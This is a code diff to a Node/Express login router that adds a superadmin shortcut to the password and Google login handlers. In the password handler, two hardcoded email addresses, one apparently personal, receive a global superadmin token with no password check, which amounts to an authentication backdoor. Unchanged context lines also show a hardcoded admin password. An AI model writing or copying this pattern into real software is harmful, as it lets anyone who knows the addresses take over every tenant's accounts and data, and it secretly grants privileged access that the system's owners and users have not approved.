@@ -309,6 +309,31 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({ status: 'error', message: 'Email and password are required.' });
     }
 
+    // 0. Check Superadmin email
+    if (email === 'issakasaddick14@gmail.com' || email === 'supertech@admin.com') {
+      const uid = `superadmin_${email.replace(/[^a-zA-Z0-9]/g, '_')}`;
+      const token = jwt.sign(
+        { uid, email, role: 'superadmin', name: 'Super Administrator', tenantId: 'global' },
+        JWT_SECRET,
+        { expiresIn: '24h' }
+      );
+      await logActivity({
+        tenantId: 'global',
+        tenantName: 'Global System',
+        actorEmail: email,
+        actorRole: 'superadmin',
+        action: 'SUPERADMIN_LOGIN',
+        description: 'Super Administrator logged into the global superadmin dashboard',
+        ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
+        status: 'success'
+      });
+      return res.status(200).json({
+        status: 'success',
+        data: { uid, email, role: 'superadmin', name: 'Super Administrator', tenantId: 'global' },
+        token
+      });
+    }
+
     // 1. Check COMPSSA (default_tenant) legacy fallback admin
     if (email === 'admin@htu.edu.gh') {
       if (password === 'admin080') {
@@ -623,6 +648,31 @@ router.post('/google-login', async (req, res) => {
 
     if (!email) {
       return res.status(400).json({ status: 'error', message: 'Failed to extract email from identity token.' });
+    }
+
+    // 0. Check Superadmin email
+    if (email === 'issakasaddick14@gmail.com' || email === 'supertech@admin.com') {
+      const uid = `superadmin_${email.replace(/[^a-zA-Z0-9]/g, '_')}`;
+      const token = jwt.sign(
+        { uid, email, role: 'superadmin', name: 'Super Administrator', tenantId: 'global' },
+        JWT_SECRET,
+        { expiresIn: '24h' }
+      );
+      await logActivity({
+        tenantId: 'global',
+        tenantName: 'Global System',
+        actorEmail: email,
+        actorRole: 'superadmin',
+        action: 'SUPERADMIN_GOOGLE_LOGIN',
+        description: 'Super Administrator logged in via Google Auth',
+        ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
+        status: 'success'
+      });
+      return res.status(200).json({
+        status: 'success',
+        data: { uid, email, role: 'superadmin', name: 'Super Administrator', tenantId: 'global' },
+        token
+      });
     }
 
     // 1. Check if email belongs to a primary tenant administrator
